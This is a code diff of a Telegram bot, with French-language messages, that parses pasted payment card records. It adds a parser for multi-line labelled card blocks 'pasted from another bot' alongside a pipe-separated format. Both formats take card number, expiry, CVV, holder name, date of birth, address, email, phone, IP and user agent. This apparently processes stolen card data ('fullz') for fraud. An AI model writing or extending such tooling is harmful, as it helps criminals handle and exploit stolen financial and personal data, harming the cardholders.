@@ -39,14 +39,27 @@ bot.on('message:text', async (ctx) => {
   const session = getSession(telegramId)
   if (!session) return
 
-  const lines = ctx.message.text
-    .split('\n')
-    .map(l => l.trim())
-    .filter(l => l && /\d{13,19}/.test(l))
+  const text = ctx.message.text
+  const isTreeFormat = /\b(?:Num[ée]ro|Nom\s*Complet|Titulaire|CVV)\s*:/i.test(text)
+
+  let lines: string[]
+  if (isTreeFormat) {
+    // Format arborescence : un message = une carte (multi-lignes).
+    // Découpe sur les marqueurs "Nom Complet:" pour gérer plusieurs cartes collées d'affilée.
+    const blocks = text.split(/(?=\n?\s*[^\n]*?(?:👤\s*)?Nom\s*Complet\s*:)/i)
+      .map(b => b.trim())
+      .filter(b => b && /\d{13,19}/.test(b))
+    lines = blocks
+  } else {
+    lines = text
+      .split('\n')
+      .map(l => l.trim())
+      .filter(l => l && /\d{13,19}/.test(l))
+  }
 
   if (lines.length === 0) {
     await ctx.reply(
-      '⚠️ Aucune carte détectée.\n\nFormat attendu (une ligne par carte) :\n<code>pan|expiry|cvv|titulaire|ddn|adresse|ville|email|tel|ip</code>',
+      '⚠️ Aucune carte détectée.\n\nFormats acceptés :\n\n1. Pipe (1 carte par ligne) :\n<code>pan|expiry|cvv|titulaire|ddn|adresse|ville|email|tel|ip|cp|ua</code>\n\n2. Arborescence (collé depuis un autre bot, avec libellés "Numéro:", "CVV:", "Nom Complet:"…)',
       { parse_mode: 'HTML' }
     )
     return
